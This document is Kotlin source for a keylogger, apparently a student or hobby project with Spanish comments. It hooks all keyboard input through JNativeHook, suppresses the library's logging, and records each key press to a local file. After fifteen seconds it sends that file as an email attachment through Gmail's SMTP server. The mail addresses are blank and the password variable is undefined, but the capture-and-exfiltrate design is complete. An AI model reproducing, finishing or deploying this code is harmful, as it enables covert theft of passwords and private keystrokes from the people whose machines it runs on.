package happyKeylogger

import com.github.kwhat.jnativehook.GlobalScreen
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener
import java.io.File
import java.util.logging.Level
import java.util.logging.Logger
import javax.mail.*
import javax.mail.internet.*
import java.util.Properties

class Keylogger : NativeKeyListener {

    private val logFile = File("keylogger_logs.txt")

    override fun nativeKeyPressed(e: NativeKeyEvent?) {
        e?.let {
            val keyText = NativeKeyEvent.getKeyText(it.keyCode)
            logKey(keyText)
        }
    }

    override fun nativeKeyReleased(e: NativeKeyEvent?) {
        //no hacemos nada al soltar teclas
    }

    override fun nativeKeyTyped(e: NativeKeyEvent?) {
        //adicional si necesitas manejar teclas tipográficas
    }

    private fun logKey(key: String) {
        try {
            logFile.appendText("$key ")
        } catch (e: Exception) {
            println("Error al escribir en el archivo: ${e.message}")
        }
    }
}

fun enviarArchivoPorCorreo(logFile: File) {
    val correoDestino = ""
    val correoRemitente = ""

    val propiedades = Properties().apply {
        put("mail.smtp.host", "smtp.gmail.com")
        put("mail.smtp.port", "587")
        put("mail.smtp.auth", "true")
        put("mail.smtp.starttls.enable", "true")
    }

    val session = Session.getInstance(propiedades, object : Authenticator() {
        override fun getPasswordAuthentication(): PasswordAuthentication {
            return PasswordAuthentication(correoRemitente, contraseñaCorreo)
        }
    })

    try {
        val mensaje = MimeMessage(session).apply {
            setFrom(InternetAddress(correoRemitente))
            addRecipient(Message.RecipientType.TO, InternetAddress(correoDestino))
            subject = "Registros del Keylogger"
            setText("Se adjunta el archivo de registro generado por el Keylogger.")

            // Adjuntar el archivo
            val adjunto = MimeBodyPart().apply {
                attachFile(logFile)
            }
            val multipart = MimeMultipart().apply {
                addBodyPart(adjunto)
            }
            setContent(multipart)
        }
        Transport.send(mensaje)
        println("Archivo enviado por correo.")
    } catch (e: MessagingException) {
        println("Error al enviar el correo: ${e.message}")
        e.printStackTrace()
    }
}

fun main() {
    val keylogger = Keylogger()

    try {
        val logger = Logger.getLogger(GlobalScreen::class.java.packageName)
        logger.level = Level.OFF
        logger.useParentHandlers = false


        GlobalScreen.registerNativeHook()
        GlobalScreen.addNativeKeyListener(keylogger)

        println("Keylogger iniciado. Presiona Ctrl+C para detenerlo manualmente.")


        val timerThread = Thread {
            try {
                Thread.sleep(15_000)
                println("Tiempo finalizado. Deteniendo el Keylogger...")
                GlobalScreen.unregisterNativeHook()
                enviarArchivoPorCorreo(File("keylogger_logs.txt"))
            } catch (e: InterruptedException) {
                println("Error en el temporizador: ${e.message}")
            }
        }

        timerThread.start()

    } catch (e: Exception) {
        println("Error al iniciar el keylogger: ${e.message}")
    }
}
